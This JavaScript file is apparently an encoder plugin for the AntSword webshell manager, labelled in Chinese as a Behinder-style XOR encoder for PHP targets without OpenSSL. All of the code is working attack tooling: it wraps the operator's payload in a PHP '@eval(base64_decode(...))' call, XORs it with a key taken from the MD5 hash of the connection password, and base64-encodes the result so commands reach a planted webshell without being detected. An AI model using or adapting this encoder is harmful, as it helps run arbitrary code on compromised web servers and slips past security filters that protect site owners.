/**
 * php:: behinder XOR 编码器, 无 openssl 扩展时使用
 * Create at: 2021/01/10 01:10:53
 * 
 */
 'use strict';
 var CryptoJS = require('crypto-js');
 /*
 * @param  {String} pwd   连接密码
 * @param  {Array}  data  编码器处理前的 payload 数组
 * @return {Array}  data  编码器处理后的 payload 数组
 */
module.exports = (pwd, data, ext={}) => {
  let randomID;
  if (ext.opts.otherConf['use-random-variable'] === 1) {
    randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
  } else {
    randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
  }
  let dataarr = Buffer.from(`${randomID}|@eval(base64_decode("${Buffer.from(data['_']).toString("base64")}"));`);
  let keyarr = Buffer.from(CryptoJS.MD5(pwd).toString().substr(0,16));
  for (let i = 0; i < dataarr.length; i++) {
    dataarr[i] = dataarr[i] ^ keyarr[i + 1 & 15];
  }
  data[pwd] = dataarr.toString("base64");
  delete data['_'];
  return data;
}
